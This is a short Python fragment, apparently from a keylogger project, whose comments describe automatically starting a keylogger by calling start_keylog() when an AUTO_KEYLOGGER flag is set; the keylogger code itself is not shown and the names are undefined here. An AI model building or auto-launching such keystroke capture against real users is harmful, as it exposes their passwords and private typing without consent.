# Example, albeit useful and probably to be incoprorated.
# Here, we are automatically running the keylogger
import sys
sys.path.append('../')

if (AUTO_KEYLOGGER):
    start_keylog()

# ^
# |
# |
# The function we call to activate it